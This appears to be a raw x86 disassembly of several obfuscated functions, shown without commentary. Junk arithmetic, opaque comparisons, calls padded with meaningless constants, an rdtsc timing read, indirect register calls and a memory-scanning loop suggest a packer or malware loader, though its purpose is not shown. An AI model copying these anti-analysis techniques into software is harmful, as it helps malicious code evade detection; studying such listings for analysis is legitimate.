  41ad04:	and    edi,ebx
  41ad06:	cmp    esi,0x6a
  41ad09:	jne    0x41adc2
  41ad0f:	mov    DWORD PTR [ebp-0x8],esi
  41ad12:	mov    edx,0xab
  41ad17:	xor    esi,esi
  41ad19:	sub    DWORD PTR [ebp-0x8],eax
  41ad1c:	cmp    edi,DWORD PTR ds:0x424090
  41ad22:	je     0x41adc2
  41ad28:	xor    ebx,ebx
  41ad2a:	xor    eax,eax
  41ad2c:	add    eax,ecx
  41ad2e:	sub    DWORD PTR [ebp-0x8],ebx
  41ad31:	add    eax,edi
  41ad33:	and    DWORD PTR [ebp-0x8],edx
  41ad36:	cmp    eax,DWORD PTR ds:0x42409c
  41ad3c:	jne    0x41adc2
  41ad42:	mov    esi,DWORD PTR [ebp-0x8]
  41ad45:	mov    edi,0x9956
  41ad4a:	add    DWORD PTR [ebp-0x8],edi
  41ad4d:	add    DWORD PTR [ebp-0x8],eax
  41ad50:	add    esi,ebx
  41ad52:	cmp    esi,0xffffffbc
  41ad55:	jne    0x41adc2
  41ad57:	add    esi,edx
  41ad59:	cmp    esi,0xd95b
  41ad5f:	je     0x41adc2
  41ad61:	mov    ebx,DWORD PTR [ebp-0x8]
  41ad64:	cmp    ebx,DWORD PTR ds:0x424094
  41ad6a:	je     0x41adc2
  41ad6c:	and    esi,ebx
  41ad6e:	xor    ebx,ebx
  41ad70:	and    ebx,edi
  41ad72:	add    ebx,ecx
  41ad74:	mov    edx,DWORD PTR ds:0x424058
  41ad7a:	sub    edx,edi
  41ad7c:	add    DWORD PTR [ebp-0x8],edx
  41ad7f:	cmp    esi,0xffffff98
  41ad82:	jne    0x41adc2
  41ad84:	add    ebx,ebx
  41ad86:	mov    eax,0x80
  41ad8b:	cmp    ebx,0xb6e4
  41ad91:	jne    0x41adc2
  41ad93:	test   ebx,0xd2
  41ad99:	je     0x41adc2
  41ad9b:	sub    DWORD PTR [ebp-0x8],esi
  41ad9e:	mov    edx,DWORD PTR ds:0x424098
  41ada4:	and    ebx,esi
  41ada6:	xor    edi,edi
  41ada8:	add    edi,edi
  41adaa:	sub    edx,ebx
  41adac:	and    DWORD PTR [ebp-0x8],eax
  41adaf:	sub    DWORD PTR [ebp-0x8],edi
  41adb2:	sub    edx,esi
  41adb4:	cmp    esi,0xffffffcb
  41adb7:	jne    0x41adc2
  41adb9:	mov    ebx,DWORD PTR [ebp-0x8]
  41adbc:	sub    DWORD PTR [ebp-0x8],ebx
  41adbf:	or     DWORD PTR [ebp-0x8],edx
  41adc2:	push   ecx
  41adc3:	push   0x8d032b00
  41adc8:	push   0xbdde2100
  41adcd:	push   0x872a1300
  41add2:	call   0x41c5c5
  41add7:	add    esp,0xc
  41adda:	push   edi
  41addb:	push   0xa1ceea00
  41ade0:	push   0xf9f5df00
  41ade5:	push   0x22
  41ade7:	push   0x8715f000
  41adec:	call   0x41c13c
  41adf1:	add    esp,0x14
  41adf4:	push   0xd63d1c92
  41adf9:	push   0x7de75600
  41adfe:	push   0xffffffca
  41ae00:	push   0x6c
  41ae02:	call   0x41c4c4
  41ae07:	add    esp,0xc
  41ae0a:	push   ebx
  41ae0b:	push   0xffffffe3
  41ae0d:	call   0x41c72f
  41ae12:	add    esp,0x8
  41ae15:	call   0x41b2cc
  41ae1a:	mov    ebx,DWORD PTR ds:0x424058
  41ae20:	mov    ecx,0x614c4a20
  41ae25:	push   ebx
  41ae26:	push   edi
  41ae27:	push   0x6a
  41ae29:	push   esi
  41ae2a:	push   0x25ee2700
  41ae2f:	call   0x41c4c4
  41ae34:	add    esp,0x14
  41ae37:	mov    esi,DWORD PTR [ebp-0x48]
  41ae3a:	push   0x356d8f00
  41ae3f:	push   0xc70d8900
  41ae44:	push   0x153baa00
  41ae49:	push   0xffffffc2
  41ae4b:	call   0x41c330
  41ae50:	add    esp,0x10
  41ae53:	shr    esi,0x10
  41ae56:	add    DWORD PTR [ebp-0x8],eax
  41ae59:	cmp    esi,0x144c
  41ae5f:	jne    0x41b0b2
  41ae65:	push   eax
  41ae66:	push   edi
  41ae67:	push   0x35eb0000
  41ae6c:	call   0x41c4c4
  41ae71:	add    esp,0xc
  41ae74:	push   0x971a7800
  41ae79:	push   0xfffffff1
  41ae7b:	call   0x41c330
  41ae80:	add    esp,0x8
  41ae83:	mov    eax,0x148eb2d8
  41ae88:	or     DWORD PTR [ebp-0x8],eax
  41ae8b:	sub    eax,DWORD PTR [ebp-0x48]
  41ae8e:	test   eax,0x53
  41ae93:	je     0x41aee1
  41ae95:	sub    ebx,esi
  41ae97:	add    ebx,eax
  41ae99:	sub    ebx,edi
  41ae9b:	xor    edx,edx
  41ae9d:	sub    edx,edi
  41ae9f:	mov    edi,0xbb
  41aea4:	add    DWORD PTR [ebp-0x8],esi
  41aea7:	sub    ebx,edi
  41aea9:	cmp    esi,DWORD PTR [ebp-0x2c]
  41aeac:	jne    0x41aee1
  41aeae:	mov    ecx,DWORD PTR [ebp-0x8]
  41aeb1:	sub    ebx,eax
  41aeb3:	mov    esi,DWORD PTR [ebp-0x8]
  41aeb6:	cmp    ecx,DWORD PTR ds:0x424094
  41aebc:	je     0x41aee1
  41aebe:	mov    edi,DWORD PTR [ebp-0x8]
  41aec1:	cmp    edi,0xf26a
  41aec7:	je     0x41aee1
  41aec9:	sub    edi,ebx
  41aecb:	add    edx,esi
  41aecd:	mov    ebx,DWORD PTR ds:0x424070
  41aed3:	mov    esi,edi
  41aed5:	sub    edx,ebx
  41aed7:	add    ecx,edx
  41aed9:	sub    esi,eax
  41aedb:	or     DWORD PTR [ebp-0x8],ecx
  41aede:	add    DWORD PTR [ebp-0x8],esi
  41aee1:	call   eax
  41aee3:	mov    edi,DWORD PTR ds:0x42408c
  41aee9:	sub    DWORD PTR [ebp-0x8],edi
  41aeec:	mov    DWORD PTR [ebp-0x38],eax
  41aeef:	push   eax
  41aef0:	push   0xcd083100
  41aef5:	push   0x85b9c200
  41aefa:	push   0x21a7a600
  41aeff:	call   0x41c72f
  41af04:	add    esp,0x10
  41af07:	mov    esi,0x41b8d3
  41af0c:	push   0x33
  41af0e:	push   0xffffff9f
  41af10:	push   0x170afa00
  41af15:	push   esi
  41af16:	call   0x41c5c5
  41af1b:	add    esp,0x10
  41af1e:	push   DWORD PTR [ebp-0x48]
  41af21:	push   0x144e655e
  41af26:	push   DWORD PTR [ebp-0x38]
  41af29:	call   esi
  41af2b:	call   0x41c72f
  41af30:	add    DWORD PTR [ebp-0x38],0x2a
  41af37:	call   0x41c4c4
  41af3c:	push   0xffffffe1
  41af3e:	push   0x6d
  41af40:	push   edi
  41af41:	push   eax
  41af42:	call   0x41c5c5
  41af47:	add    esp,0x10
  41af4a:	mov    edx,DWORD PTR [ebp-0x38]
  41af4d:	mov    eax,DWORD PTR [ebp-0x8]
  41af50:	cmp    eax,0xffffffaa
  41af53:	jne    0x41af79
  41af55:	mov    esi,0x49db
  41af5a:	xor    edi,edi
  41af5c:	cmp    eax,0xffffff8c
  41af5f:	je     0x41af79
  41af61:	add    DWORD PTR [ebp-0x8],eax
  41af64:	add    DWORD PTR [ebp-0x8],edx
  41af67:	mov    eax,DWORD PTR [ebp-0x8]
  41af6a:	mov    ecx,esi
  41af6c:	sub    DWORD PTR [ebp-0x8],edi
  41af6f:	sub    eax,edi
  41af71:	or     DWORD PTR [ebp-0x8],ecx
  41af74:	add    eax,edx
  41af76:	add    DWORD PTR [ebp-0x8],eax
  41af79:	call   edx
  41af7b:	push   0xb9909400
  41af80:	push   esi
  41af81:	push   0xfffffffa
  41af83:	push   0x9efa100
  41af88:	push   0x8d1ddd00
  41af8d:	call   0x41c20f
  41af92:	add    esp,0x14
  41af95:	mov    esi,DWORD PTR [ebp-0x8]
  41af98:	push   0xb5ec2500
  41af9d:	call   0x41c20f
  41afa2:	add    esp,0x4
  41afa5:	push   0x9972700
  41afaa:	push   0xfffffff0
  41afac:	call   0x41c5c5
  41afb1:	add    esp,0x8
  41afb4:	mov    ebx,DWORD PTR [ebp-0x8]
  41afb7:	call   0x41c5c5
  41afbc:	sub    DWORD PTR [ebp-0x8],esi
  41afbf:	call   0x41c13c
  41afc4:	call   0x41c4c4
  41afc9:	push   0x95ddca00
  41afce:	push   0x61f3ac00
  41afd3:	push   0xffffff89
  41afd5:	push   0x8d59e900
  41afda:	push   edi
  41afdb:	call   0x41c5c5
  41afe0:	add    esp,0x14
  41afe3:	push   esi
  41afe4:	push   0x70
  41afe6:	push   0x46
  41afe8:	push   esi
  41afe9:	call   0x41c72f
  41afee:	add    esp,0x10
  41aff1:	push   0x3515b500
  41aff6:	push   0xffffffe7
  41aff8:	call   0x41c330
  41affd:	add    esp,0x8
  41b000:	push   0x1dafec00
  41b005:	push   0xfffffff7
  41b007:	push   0x59
  41b009:	call   0x41c330
  41b00e:	add    esp,0xc
  41b011:	push   esi
  41b012:	push   0x6dedda00
  41b017:	push   0x4b
  41b019:	push   0xd865100
  41b01e:	push   0xffffffdf
  41b020:	call   0x41c72f
  41b025:	add    esp,0x14
  41b028:	sub    ebx,eax
  41b02a:	push   esi
  41b02b:	push   0xffffffd7
  41b02d:	call   0x41c5c5
  41b032:	add    esp,0x8
  41b035:	push   0xa1976500
  41b03a:	push   0xc730fe00
  41b03f:	call   0x41c4c4
  41b044:	add    esp,0x8
  41b047:	call   0x41c5c5
  41b04c:	and    ebx,edi
  41b04e:	test   ebx,0x4b9a
  41b054:	je     0x41b091
  41b056:	sub    ebx,eax
  41b058:	push   0xffffffed
  41b05a:	push   0xd2bcb00
  41b05f:	call   0x41c20f
  41b064:	add    esp,0x8
  41b067:	push   0x6702e400
  41b06c:	call   0x41c5c5
  41b071:	add    esp,0x4
  41b074:	cmp    ebx,0x1d
  41b077:	jne    0x41b091
  41b079:	push   0x870b5500
  41b07e:	push   0x67035b00
  41b083:	push   edi
  41b084:	push   0xfffffff6
  41b086:	call   0x41c13c
  41b08b:	add    esp,0x10
  41b08e:	and    DWORD PTR [ebp-0x8],ebx
  41b091:	call   0x41c4c4
  41b096:	mov    ecx,DWORD PTR ds:0x424088
  41b09c:	push   0x57040200
  41b0a1:	call   0x41c330
  41b0a6:	add    esp,0x4
  41b0a9:	push   esi
  41b0aa:	call   0x41c330
  41b0af:	add    esp,0x4
  41b0b2:	mov    esi,DWORD PTR ds:0x42409c
  41b0b8:	sub    esi,eax
  41b0ba:	mov    edi,DWORD PTR ds:0x42408c
  41b0c0:	call   0x41c13c
  41b0c5:	call   0x41c72f
  41b0ca:	sub    esi,ebx
  41b0cc:	add    DWORD PTR [ebp-0x8],edi
  41b0cf:	push   0xfffffff0
  41b0d1:	push   eax
  41b0d2:	call   0x41c5c5
  41b0d7:	add    esp,0x8
  41b0da:	push   0x15342c00
  41b0df:	call   0x41c5c5
  41b0e4:	add    esp,0x4
  41b0e7:	push   esi
  41b0e8:	push   edi
  41b0e9:	push   0x21efb600
  41b0ee:	push   0xffffffc7
  41b0f0:	push   0xffffffa9
  41b0f2:	call   0x41c13c
  41b0f7:	add    esp,0x14
  41b0fa:	and    esi,eax
  41b0fc:	cmp    esi,DWORD PTR [ebp-0xc]
  41b0ff:	jne    0x41b234
  41b105:	mov    edi,DWORD PTR ds:0x42405c
  41b10b:	push   0xffffffc9
  41b10d:	push   0x57146c00
  41b112:	push   0x5df6ba00
  41b117:	push   0x12
  41b119:	push   0xc7260200
  41b11e:	call   0x41c72f
  41b123:	add    esp,0x14
  41b126:	push   edi
  41b127:	push   0x976de800
  41b12c:	push   ebx
  41b12d:	push   0xffffffa3
  41b12f:	call   0x41c5c5
  41b134:	add    esp,0x10
  41b137:	test   esi,0xa0
  41b13d:	jne    0x41b234
  41b143:	push   0x15
  41b145:	push   0x4c
  41b147:	push   0xe9a5c800
  41b14c:	call   0x41c13c
  41b151:	add    esp,0xc
  41b154:	call   0x41c72f
  41b159:	push   0xc1f17e00
  41b15e:	call   0x41c20f
  41b163:	add    esp,0x4
  41b166:	add    esi,esi
  41b168:	push   0xffffffd8
  41b16a:	push   0xd7241800
  41b16f:	push   0xfffffff0
  41b171:	call   0x41c13c
  41b176:	add    esp,0xc
  41b179:	push   0xffffffe9
  41b17b:	call   0x41c13c
  41b180:	add    esp,0x4
  41b183:	push   0x47609900
  41b188:	push   0x3a
  41b18a:	push   0xd34ee00
  41b18f:	push   edi
  41b190:	call   0x41c330
  41b195:	add    esp,0x10
  41b198:	push   edi
  41b199:	push   0x2c
  41b19b:	push   0xffffff9a
  41b19d:	call   0x41c4c4
  41b1a2:	add    esp,0xc
  41b1a5:	or     DWORD PTR [ebp-0x8],eax
  41b1a8:	mov    edx,DWORD PTR [ebp-0x8]
  41b1ab:	cmp    esi,edi
  41b1ad:	je     0x41b234
  41b1b3:	mov    ecx,DWORD PTR [ebp-0x8]
  41b1b6:	or     DWORD PTR [ebp-0x8],edx
  41b1b9:	call   0x41c72f
  41b1be:	push   0xffffffe9
  41b1c0:	push   edi
  41b1c1:	call   0x41c5c5
  41b1c6:	add    esp,0x8
  41b1c9:	xor    ecx,ecx
  41b1cb:	push   edi
  41b1cc:	push   ebx
  41b1cd:	push   0x8d49f900
  41b1d2:	call   0x41c72f
  41b1d7:	add    esp,0xc
  41b1da:	push   0xffffffb0
  41b1dc:	push   0x1dfc5400
  41b1e1:	push   0x675a9e00
  41b1e6:	call   0x41c330
  41b1eb:	add    esp,0xc
  41b1ee:	push   0x1729fe00
  41b1f3:	push   0x2a
  41b1f5:	push   0xfdd0dd00
  41b1fa:	push   edi
  41b1fb:	push   0xe1bd7500
  41b200:	call   0x41c330
  41b205:	add    esp,0x14
  41b208:	push   0x20
  41b20a:	call   0x41c4c4
  41b20f:	add    esp,0x4
  41b212:	push   0x22
  41b214:	push   0xcd40e500
  41b219:	call   0x41c20f
  41b21e:	add    esp,0x8
  41b221:	push   0x175ec600
  41b226:	push   0x9dbb8800
  41b22b:	push   esi
  41b22c:	call   0x41c13c
  41b231:	add    esp,0xc
  41b234:	push   eax
  41b235:	call   0x41c4c4
  41b23a:	add    esp,0x4
  41b23d:	push   eax
  41b23e:	push   ebx
  41b23f:	push   0x24
  41b241:	call   0x41c330
  41b246:	add    esp,0xc
  41b249:	pop    edi
  41b24a:	call   0x41c4c4
  41b24f:	push   edi
  41b250:	call   0x41c20f
  41b255:	add    esp,0x4
  41b258:	pop    esi
  41b259:	cmp    ebx,edi
  41b25b:	je     0x41b287
  41b25d:	mov    ebx,0x5
  41b262:	push   0x1598cb00
  41b267:	call   0x41c330
  41b26c:	add    esp,0x4
  41b26f:	add    DWORD PTR [ebp-0x8],esi
  41b272:	push   0x198cac00
  41b277:	push   0xd7160500
  41b27c:	call   0x41c13c
  41b281:	add    esp,0x8
  41b284:	sub    DWORD PTR [ebp-0x8],ebx
  41b287:	push   0x7480100
  41b28c:	call   0x41c330
  41b291:	add    esp,0x4
  41b294:	pop    ebx
  41b295:	cmp    ebx,DWORD PTR ds:0x424058
  41b29b:	jne    0x41b2bc
  41b29d:	test   ebx,0x6747
  41b2a3:	je     0x41b2bc
  41b2a5:	mov    ecx,DWORD PTR ds:0x424060
  41b2ab:	push   0x6595d900
  41b2b0:	push   0xffffff80
  41b2b2:	push   eax
  41b2b3:	push   ecx
  41b2b4:	call   0x41c13c
  41b2b9:	add    esp,0x10
  41b2bc:	push   edi
  41b2bd:	call   0x41c20f
  41b2c2:	add    esp,0x4
  41b2c5:	leave  
  41b2c6:	ret    
  41b2c7:	int3   
  41b2c8:	int3   
  41b2c9:	int3   
  41b2ca:	int3   
  41b2cb:	int3   
  41b2cc:	push   ebp
  41b2cd:	mov    ebp,esp
  41b2cf:	sub    esp,0x40
  41b2d2:	push   0x61
  41b2d4:	push   0xadd3b800
  41b2d9:	push   0xffffff8c
  41b2db:	push   0xffffff8c
  41b2dd:	call   0x41c13c
  41b2e2:	add    esp,0x10
  41b2e5:	push   ebx
  41b2e6:	add    eax,eax
  41b2e8:	push   0x47023a00
  41b2ed:	push   eax
  41b2ee:	call   0x41c5c5
  41b2f3:	add    esp,0x8
  41b2f6:	call   0x41c4c4
  41b2fb:	push   esi
  41b2fc:	call   0x41c20f
  41b301:	push   edi
  41b302:	xor    eax,eax
  41b304:	mov    DWORD PTR [ebp-0x28],eax
  41b307:	add    eax,eax
  41b309:	push   0xffffffd7
  41b30b:	push   eax
  41b30c:	call   0x41c4c4
  41b311:	add    esp,0x8
  41b314:	mov    DWORD PTR [ebp-0x34],0x520b2fea
  41b31b:	push   0x7c
  41b31d:	push   eax
  41b31e:	push   0xd463600
  41b323:	push   0x81868f00
  41b328:	call   0x41c330
  41b32d:	add    esp,0x10
  41b330:	call   0x41b681
  41b335:	mov    ebx,DWORD PTR [ebp-0x28]
  41b338:	add    DWORD PTR [ebp-0x28],ebx
  41b33b:	mov    DWORD PTR [ebp-0x18],eax
  41b33e:	push   0x153ff300
  41b343:	call   0x41c72f
  41b348:	add    esp,0x4
  41b34b:	call   0x41c72f
  41b350:	call   0x41b681
  41b355:	cmp    eax,0x67
  41b358:	je     0x41b371
  41b35a:	mov    edx,DWORD PTR [ebp-0x28]
  41b35d:	and    edx,eax
  41b35f:	cmp    edx,DWORD PTR ds:0x4240b8
  41b365:	je     0x41b371
  41b367:	xor    edi,edi
  41b369:	add    edx,ebx
  41b36b:	add    DWORD PTR [ebp-0x28],edx
  41b36e:	add    DWORD PTR [ebp-0x28],edi
  41b371:	mov    DWORD PTR [ebp-0x20],eax
  41b374:	mov    eax,0xbc
  41b379:	push   0xffffffb6
  41b37b:	push   0x33
  41b37d:	call   0x41c330
  41b382:	add    esp,0x8
  41b385:	call   0x41c20f
  41b38a:	call   0x41b681
  41b38f:	sub    ebx,eax
  41b391:	add    ebx,edi
  41b393:	cmp    ebx,edi
  41b395:	je     0x41b3a2
  41b397:	mov    edx,0x91
  41b39c:	sub    DWORD PTR [ebp-0x28],ebx
  41b39f:	and    DWORD PTR [ebp-0x28],edx
  41b3a2:	mov    DWORD PTR [ebp-0x10],eax
  41b3a5:	push   0xffffff8c
  41b3a7:	push   0xfffffffc
  41b3a9:	call   0x41c5c5
  41b3ae:	add    esp,0x8
  41b3b1:	push   ebx
  41b3b2:	push   edx
  41b3b3:	call   0x41c13c
  41b3b8:	add    esp,0x8
  41b3bb:	mov    esi,DWORD PTR [ebp-0x20]
  41b3be:	mov    ecx,DWORD PTR [ebp-0x28]
  41b3c1:	push   0x6dff9500
  41b3c6:	push   eax
  41b3c7:	push   0x20
  41b3c9:	push   0xfffffffe
  41b3cb:	push   0xfd82f900
  41b3d0:	call   0x41c330
  41b3d5:	add    esp,0x14
  41b3d8:	sub    esi,DWORD PTR [ebp-0x18]
  41b3db:	xor    eax,eax
  41b3dd:	sub    eax,ebx
  41b3df:	and    eax,ebx
  41b3e1:	and    DWORD PTR [ebp-0x28],eax
  41b3e4:	xor    esi,0x467d74ba
  41b3ea:	push   0x4
  41b3ec:	push   0xffffffc1
  41b3ee:	push   ebx
  41b3ef:	call   0x41c330
  41b3f4:	add    esp,0xc
  41b3f7:	mov    edi,DWORD PTR [ebp-0x10]
  41b3fa:	push   0x46
  41b3fc:	call   0x41c20f
  41b401:	add    esp,0x4
  41b404:	sub    edi,DWORD PTR [ebp-0x20]
  41b407:	push   0x99a0be00
  41b40c:	call   0x41c72f
  41b411:	add    esp,0x4
  41b414:	xor    edi,0x467d74bf
  41b41a:	cmp    edi,DWORD PTR ds:0x4240b8
  41b420:	je     0x41b42a
  41b422:	mov    eax,DWORD PTR [ebp-0x28]
  41b425:	call   0x41c5c5
  41b42a:	push   0x2def2400
  41b42f:	push   0xcd1ee200
  41b434:	push   0x2f
  41b436:	call   0x41c330
  41b43b:	add    esp,0xc
  41b43e:	cmp    esi,edi
  41b440:	je     0x41b533
  41b446:	cmp    ebx,edi
  41b448:	jne    0x41b460
  41b44a:	mov    ecx,DWORD PTR ds:0x4240b8
  41b450:	push   0x671a7300
  41b455:	push   0xffffff9d
  41b457:	push   ebx
  41b458:	call   0x41c13c
  41b45d:	add    esp,0xc
  41b460:	push   0x4240b8
  41b465:	call   DWORD PTR ds:0x421a20
  41b46b:	mov    edi,eax
  41b46d:	mov    edx,0x6b
  41b472:	mov    DWORD PTR [ebp-0x28],edi
  41b475:	and    edx,esi
  41b477:	add    DWORD PTR [ebp-0x28],edx
  41b47a:	or     eax,eax
  41b47c:	je     0x41b533
  41b482:	mov    ecx,DWORD PTR [ebp-0x28]
  41b485:	mov    edi,DWORD PTR [ebp-0x28]
  41b488:	add    DWORD PTR [ebp-0x28],ecx
  41b48b:	add    edi,edx
  41b48d:	or     edi,eax
  41b48f:	and    DWORD PTR [ebp-0x28],edx
  41b492:	cmp    edi,0x2de6
  41b498:	jne    0x41b4a1
  41b49a:	sub    edi,edx
  41b49c:	and    edi,esi
  41b49e:	sub    DWORD PTR [ebp-0x28],edi
  41b4a1:	add    DWORD PTR [ebp-0x34],0xc2420017
  41b4a8:	or     DWORD PTR [ebp-0x28],esi
  41b4ab:	lea    edi,[eax+0xfa5]
  41b4b1:	push   ebx
  41b4b2:	push   0xffffffee
  41b4b4:	push   0x41ea0900
  41b4b9:	push   esi
  41b4ba:	push   esi
  41b4bb:	call   0x41c4c4
  41b4c0:	add    esp,0x14
  41b4c3:	inc    edi
  41b4c4:	push   eax
  41b4c5:	call   0x41c5c5
  41b4ca:	add    esp,0x4
  41b4cd:	push   0x62
  41b4cf:	push   edi
  41b4d0:	push   ebx
  41b4d1:	push   esi
  41b4d2:	call   0x41c330
  41b4d7:	add    esp,0x10
  41b4da:	mov    esi,DWORD PTR [edi]
  41b4dc:	push   esi
  41b4dd:	push   0x1531ce00
  41b4e2:	push   esi
  41b4e3:	push   0xffffffe2
  41b4e5:	push   0x8d59c900
  41b4ea:	call   0x41c72f
  41b4ef:	add    esp,0x14
  41b4f2:	call   0x41c4c4
  41b4f7:	sub    esi,0x7e760e9d
  41b4fd:	call   0x41c20f
  41b502:	call   0x41c13c
  41b507:	cmp    esi,0xdd99fd74
  41b50d:	jne    0x41b4b1
  41b50f:	xor    DWORD PTR [ebp-0x28],eax
  41b512:	mov    esi,DWORD PTR [edi+0x4]
  41b515:	test   esi,0xba
  41b51b:	jne    0x41b530
  41b51d:	cmp    esi,eax
  41b51f:	jne    0x41b530
  41b521:	push   0x65
  41b523:	push   edi
  41b524:	push   eax
  41b525:	push   0x67
  41b527:	push   ebx
  41b528:	call   0x41c20f
  41b52d:	add    esp,0x14
  41b530:	sub    DWORD PTR [ebp-0x34],esi
  41b533:	push   0x61
  41b535:	push   ebx
  41b536:	call   0x41c330
  41b53b:	add    esp,0x8
  41b53e:	push   ebx
  41b53f:	push   eax
  41b540:	push   0x156c8500
  41b545:	push   0x1d9c2400
  41b54a:	push   eax
  41b54b:	call   0x41c330
  41b550:	add    esp,0x14
  41b553:	push   0x69
  41b555:	push   0xd064000
  41b55a:	push   esi
  41b55b:	push   0xffffffeb
  41b55d:	push   esi
  41b55e:	call   0x41c13c
  41b563:	add    esp,0x14
  41b566:	push   0x57056c00
  41b56b:	call   0x41c4c4
  41b570:	add    esp,0x4
  41b573:	mov    edi,DWORD PTR [ebp+0xc]
  41b576:	mov    DWORD PTR [ebp-0x28],edi
  41b579:	push   0x6e
  41b57b:	push   esi
  41b57c:	push   0xfffffffe
  41b57e:	push   edi
  41b57f:	push   0xffffff94
  41b581:	call   0x41c4c4
  41b586:	add    esp,0x14
  41b589:	mov    edx,DWORD PTR [ebp-0x34]
  41b58c:	mov    ecx,DWORD PTR [ebp-0x28]
  41b58f:	cmp    edx,0xffffffad
  41b592:	je     0x41b5e3
  41b594:	sub    ecx,edx
  41b596:	mov    esi,DWORD PTR [ebp-0x28]
  41b599:	cmp    ecx,0x119
  41b59f:	je     0x41b5e3
  41b5a1:	sub    DWORD PTR [ebp-0x28],eax
  41b5a4:	xor    ebx,ebx
  41b5a6:	add    DWORD PTR [ebp-0x28],edx
  41b5a9:	xor    eax,eax
  41b5ab:	sub    eax,edi
  41b5ad:	add    esi,ebx
  41b5af:	sub    DWORD PTR [ebp-0x28],eax
  41b5b2:	sub    DWORD PTR [ebp-0x28],ecx
  41b5b5:	cmp    esi,eax
  41b5b7:	jne    0x41b5e3
  41b5b9:	mov    eax,DWORD PTR [ebp-0x28]
  41b5bc:	mov    ecx,0xe8
  41b5c1:	add    esi,ebx
  41b5c3:	sub    eax,ebx
  41b5c5:	add    eax,ebx
  41b5c7:	sub    DWORD PTR [ebp-0x28],ecx
  41b5ca:	sub    eax,ecx
  41b5cc:	add    esi,ecx
  41b5ce:	cmp    esi,0xffffffd1
  41b5d1:	jne    0x41b5e3
  41b5d3:	add    DWORD PTR [ebp-0x28],eax
  41b5d6:	cmp    esi,DWORD PTR ds:0x4240b8
  41b5dc:	jne    0x41b5e3
  41b5de:	add    esi,edx
  41b5e0:	add    DWORD PTR [ebp-0x28],esi
  41b5e3:	mov    DWORD PTR [edi+0x0],edx
  41b5e6:	push   0xa766cc00
  41b5eb:	push   ecx
  41b5ec:	push   0x40
  41b5ee:	push   esi
  41b5ef:	call   0x41c13c
  41b5f4:	add    esp,0x10
  41b5f7:	push   0x33
  41b5f9:	call   0x41c5c5
  41b5fe:	add    esp,0x4
  41b601:	mov    eax,DWORD PTR [ebp-0x28]
  41b604:	push   esi
  41b605:	push   0x10
  41b607:	push   esi
  41b608:	push   0x15251c00
  41b60d:	call   0x41c72f
  41b612:	add    esp,0x10
  41b615:	push   0xffffffd0
  41b617:	push   0xd102800
  41b61c:	call   0x41c13c
  41b621:	add    esp,0x8
  41b624:	pop    edi
  41b625:	mov    eax,DWORD PTR [ebp-0x28]
  41b628:	mov    esi,eax
  41b62a:	call   0x41c72f
  41b62f:	push   0x735e500
  41b634:	push   0xe739c500
  41b639:	call   0x41c5c5
  41b63e:	add    esp,0x8
  41b641:	cmp    edi,DWORD PTR [ebp-0x24]
  41b644:	jne    0x41b64e
  41b646:	cmp    esi,0x19
  41b649:	jne    0x41b64e
  41b64b:	sub    DWORD PTR [ebp-0x28],esi
  41b64e:	pop    esi
  41b64f:	call   0x41c13c
  41b654:	push   0x1e
  41b656:	push   0x39c77400
  41b65b:	push   edi
  41b65c:	push   0xf
  41b65e:	call   0x41c72f
  41b663:	add    esp,0x10
  41b666:	pop    ebx
  41b667:	push   0xffffffd0
  41b669:	push   0x4d08c700
  41b66e:	push   0xffffffc2
  41b670:	call   0x41c20f
  41b675:	add    esp,0xc
  41b678:	leave  
  41b679:	ret    0x8
  41b67c:	int3   
  41b67d:	int3   
  41b67e:	int3   
  41b67f:	int3   
  41b680:	int3   
  41b681:	push   ebp
  41b682:	mov    ebp,esp
  41b684:	sub    esp,0x24
  41b687:	push   0xffffffa5
  41b689:	push   0x3
  41b68b:	push   0x4f
  41b68d:	push   0x68
  41b68f:	push   0xffffffc5
  41b691:	call   0x41c20f
  41b696:	add    esp,0x14
  41b699:	push   ebx
  41b69a:	xor    ebx,ebx
  41b69c:	push   eax
  41b69d:	push   eax
  41b69e:	push   0x3c
  41b6a0:	push   0xcd308700
  41b6a5:	push   0xf5f11600
  41b6aa:	call   0x41c72f
  41b6af:	add    esp,0x14
  41b6b2:	push   eax
  41b6b3:	push   0x79c3a000
  41b6b8:	push   0x3c
  41b6ba:	call   0x41c72f
  41b6bf:	add    esp,0xc
  41b6c2:	push   0xffffffe0
  41b6c4:	push   0x25bc3c00
  41b6c9:	call   0x41c4c4
  41b6ce:	add    esp,0x8
  41b6d1:	xor    eax,eax
  41b6d3:	mov    DWORD PTR [ebp-0x20],ebx
  41b6d6:	call   0x41c72f
  41b6db:	push   0x3dd1d100
  41b6e0:	call   0x41c330
  41b6e5:	add    esp,0x4
  41b6e8:	push   esi
  41b6e9:	mov    eax,DWORD PTR [ebp-0x20]
  41b6ec:	mov    esi,DWORD PTR [ebp-0x20]
  41b6ef:	cmp    esi,0x9ad9
  41b6f5:	jne    0x41b730
  41b6f7:	mov    ebx,eax
  41b6f9:	push   0xffffffa4
  41b6fb:	push   0x7e
  41b6fd:	push   0x6a
  41b6ff:	push   0xe5e97f00
  41b704:	push   ebx
  41b705:	call   0x41c5c5
  41b70a:	add    esp,0x14
  41b70d:	push   0xd53de00
  41b712:	call   0x41c330
  41b717:	add    esp,0x4
  41b71a:	mov    ebx,esi
  41b71c:	push   0x8d3b3800
  41b721:	push   ebx
  41b722:	push   0xf77fb700
  41b727:	push   eax
  41b728:	call   0x41c20f
  41b72d:	add    esp,0x10
  41b730:	push   edi
  41b731:	call   0x41c330
  41b736:	push   ebx
  41b737:	call   0x41c330
  41b73c:	add    esp,0x4
  41b73f:	push   ebx
  41b740:	push   0x29a36f00
  41b745:	call   0x41c20f
  41b74a:	add    esp,0x8
  41b74d:	call   0x41c13c
  41b752:	call   0x41c4c4
  41b757:	rdtsc  
  41b759:	sub    edx,ebx
  41b75b:	add    edx,esi
  41b75d:	mov    esi,DWORD PTR [ebp-0x20]
  41b760:	add    DWORD PTR [ebp-0x20],eax
  41b763:	mov    ecx,DWORD PTR [ebp-0x20]
  41b766:	cmp    esi,0x1012941
  41b76c:	jne    0x41b7e4
  41b76e:	mov    edi,esi
  41b770:	mov    esi,DWORD PTR [ebp-0x20]
  41b773:	sub    DWORD PTR [ebp-0x20],esi
  41b776:	cmp    ecx,ebx
  41b778:	jne    0x41b7e4
  41b77a:	mov    ebx,DWORD PTR [ebp-0x20]
  41b77d:	mov    esi,DWORD PTR [ebp-0x20]
  41b780:	add    ecx,ecx
  41b782:	cmp    esi,edi
  41b784:	jne    0x41b7e4
  41b786:	add    DWORD PTR [ebp-0x20],edx
  41b789:	cmp    ecx,edi
  41b78b:	je     0x41b7e4
  41b78d:	cmp    edi,0xffffffe0
  41b790:	jne    0x41b7e4
  41b792:	mov    edx,0x4
